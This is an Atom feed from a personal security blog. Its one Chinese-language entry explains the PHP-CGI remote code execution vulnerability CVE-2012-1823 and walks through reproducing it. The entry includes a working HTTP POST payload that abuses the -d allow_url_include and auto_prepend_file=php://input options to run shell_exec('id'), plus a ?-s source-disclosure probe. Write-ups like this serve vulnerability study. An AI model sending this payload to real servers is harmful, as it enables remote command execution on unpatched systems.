<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lewiserii&#39;s blog</title>
  
  
  <link href="https://lewiserii.github.io/atom.xml" rel="self"/>
  
  <link href="https://lewiserii.github.io/"/>
  <updated>2021-06-11T04:44:58.993Z</updated>
  <id>https://lewiserii.github.io/</id>
  
  <author>
    <name>lewiserii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</title>
    <link href="https://lewiserii.github.io/2021/06/11/CVE-2012-1823/"/>
    <id>https://lewiserii.github.io/2021/06/11/CVE-2012-1823/</id>
    <published>2021-06-11T04:00:00.000Z</published>
    <updated>2021-06-11T04:44:58.993Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-漏洞说明"><a href="#0x01-漏洞说明" class="headerlink" title="0x01 漏洞说明"></a>0x01 漏洞说明</h1><p>漏洞影响版本<br>php &lt; 5.3.12 or php &lt; 5.4.2<br>CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p><h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。</p><p>RFC3875中规定，当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。所以Apache服务器按要求实现了这个功能。但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。但开发者是为了方便使用类似#!/usr/local/bin/php-cgi -d include_path=/path的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。</p><p>于是，源程序中的if(!cgi) getopt(…)被删掉了。</p><p>根据RFC中对于command line的说明，命令行参数不光可以通过#!/usr/local/bin/php-cgi -d include_path=/path的方式传入php-cgi，更可以通过querystring的方式传入。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><ul><li>CGI模式下的参数：<ul><li>-c 指定php.ini文件的位置</li><li>-n 不要加载php.ini文件</li><li>-d 指定配置项</li><li>-b 启动fastcgi进程</li><li>-s 显示文件源码</li><li>-T 执行指定次该文件</li><li>-h和-？ 显示帮助</li></ul></li></ul><p>访问 URL/index.php?-s ，爆出源码，说明漏洞存在。发送如下数据包，可见Body中的代码已被执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">\&lt;?php echo shell_exec(&quot;id&quot;); ?\&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60c2e316c77be.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-漏洞说明&quot;&gt;&lt;a href=&quot;#0x01-漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞说明&quot;&gt;&lt;/a&gt;0x01 漏洞说明&lt;/h1&gt;&lt;p&gt;漏洞影响版本&lt;br&gt;php &amp;lt; 5.3.12 or php &amp;lt; 5.4.</summary>
      
    
    
    
    <category term="CVE-2012" scheme="https://lewiserii.github.io/categories/CVE-2012/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
</feed>
